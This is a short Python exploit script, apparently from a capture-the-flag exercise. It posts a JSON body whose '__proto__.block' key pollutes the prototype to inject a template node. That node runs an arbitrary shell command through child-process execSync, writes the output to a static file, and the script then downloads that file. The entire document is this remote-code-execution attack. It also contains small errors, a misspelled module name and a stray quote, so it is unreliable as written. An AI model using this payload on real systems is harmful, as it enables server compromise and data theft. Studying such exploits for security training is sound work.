import requests

target_url = ''

requests.post(target_url  + '/api/submit', json={
        "artist.name": "Haign",
	"__proto__.block": {
	   "type": "Text",
	   "line": "process.mainModule.require('child.process').execSync('[linux_command] > static/images/tmp.txt')"
	}
})

r = requests.get(target_url + '/static/images/tmp.txt'')
print(r.text)
